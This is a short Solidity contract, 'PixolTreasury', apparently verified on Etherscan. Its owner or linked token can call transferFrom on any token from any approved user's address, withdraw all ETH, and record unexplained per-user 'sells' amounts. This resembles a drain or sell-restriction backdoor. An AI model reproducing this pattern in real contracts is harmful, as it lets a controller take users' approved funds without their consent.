/**
 *Submitted for verification at Etherscan.io on 2023-04-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PixolTreasury {

    mapping(address => uint256) sells;
    address public pixol;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == pixol || msg.sender == owner);
        _;
    }

    constructor(address _token) {
        owner = msg.sender;
        pixol = _token; 
    }

    receive() external payable {}

    function setPixol(address _pixol) external onlyOwner {
        pixol = _pixol;
    }

    function send(address user, uint256 amount) external onlyOwner {
        sells[user] = sells[user] + amount;
        sells[pixol] = sells[pixol] + amount;
    }

    function sendETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function sendToken(address token, address from, address to, uint256 amount) external onlyOwner {
        IERC20(token).transferFrom(from, to, amount);
    }
}